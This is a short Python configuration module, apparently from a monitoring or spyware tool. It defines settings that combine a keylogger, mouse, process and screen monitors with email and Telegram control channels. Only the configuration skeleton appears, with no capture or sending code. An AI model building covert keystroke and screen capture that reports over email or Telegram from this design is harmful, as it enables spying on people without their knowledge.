from dataclasses import dataclass
import enum

from ..core.components import keylogger as _keylogger
from ..core.components import mouse as _mouse
from ..core.components import process as _process
from ..core.components import screen as _screen
from ..core import email as _email
from ..core import telegram as _telegram


class CtrlMode(enum.Enum):
    EMAIL = 0
    TELEGRAM = 1


@dataclass
class _General:
    controlMode: CtrlMode
    monitorEvery: int
    saveDataTo: str


@dataclass
class Configuration:
    general: _General
    email: _email.Configuration
    telegram: _telegram.Configuration
    keylogger: _keylogger.Configuration
    processMntr: _process.Configuration
    mouseMntr: _mouse.Configuration
    screenMntr: _screen.Configuration
